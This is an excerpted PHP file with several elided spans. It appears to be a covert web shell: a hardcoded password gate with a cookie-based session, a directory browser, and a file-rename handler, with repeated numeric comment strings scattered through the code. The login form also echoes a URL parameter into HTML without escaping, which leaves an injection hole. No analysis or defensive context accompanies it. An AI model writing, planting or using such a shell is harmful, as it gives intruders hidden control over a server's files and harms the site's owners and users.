...
$auth_key = "a3ec93904c840a51405b461a97aba814";
...
$pass = false;
if (isset($_COOKIE['pw_name_68704'])) {
    if(($_COOKIE['pw_name_68704']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_68704'])) {
        if(($_POST['pw_name_68704']) == $auth_key) {
            setcookie("pw_name_68704", $_POST['pw_name_68704']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_68704' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724476178252423 1724476178622408 1724476178613274 1724476178128610
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724476178252423 1724476178622408 1724476178613274 1724476178128610
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724476178252423 1724476178622408 1724476178613274 1724476178128610
            $name = PATH . "/" . $_GET['r'];
